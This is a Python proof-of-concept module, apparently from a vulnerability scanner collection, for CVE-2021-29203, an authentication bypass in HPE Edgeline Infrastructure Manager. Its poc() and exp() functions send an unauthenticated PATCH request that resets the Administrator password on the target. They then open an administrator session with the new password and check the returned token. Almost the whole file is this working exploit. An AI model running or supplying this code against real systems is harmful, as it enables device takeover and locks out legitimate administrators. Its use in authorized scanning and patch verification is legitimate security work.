import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''HPE Edgeline Infrastructure Manager v1.21 Authentication Bypass''',
        "description": '''A security vulnerability has been identified in the HPE Edgeline Infrastructure Manager, also known as HPE Edgeline Infrastructure Management Software, prior to version 1.22. The vulnerability could be remotely exploited to bypass remote authentication leading to execution of arbitrary commands, gaining privileged access, causing denial of service, and changing the configuration. HPE has released a software update to resolve the vulnerability in the HPE Edgeline Infrastructure Manager.''',
        "severity": "critical",
        "references": [
            "https://www.tenable.com/security/research/tra-2021-15", 
            "https://nvd.nist.gov/vuln/detail/CVE-2021-29203"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-29203",
            "cwe-id": "CWE-287"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["hpe", "cve", "cve2021", "bypass"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/redfish/v1/SessionService/ResetPassword/1/"""
        method = "PATCH"
        data = """{"Password":"{{randstr}}"}"""
        headers = {'Accept': '*/*', 'Content-Type': 'application/json'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/redfish/v1/SessionService/Sessions/"""
        method = "POST"
        data = """{"UserName":"Administrator","Password":"{{randstr}}"}"""
        headers = {'Content-Type': 'application/json'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp1.status_code == 201) and ("""X-Auth-Token""" in str(resp1.headers) and """PasswordReset""" in str(resp1.headers) and """Location""" in str(resp1.headers)) and ("""Base.1.0.Created""" in resp1.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url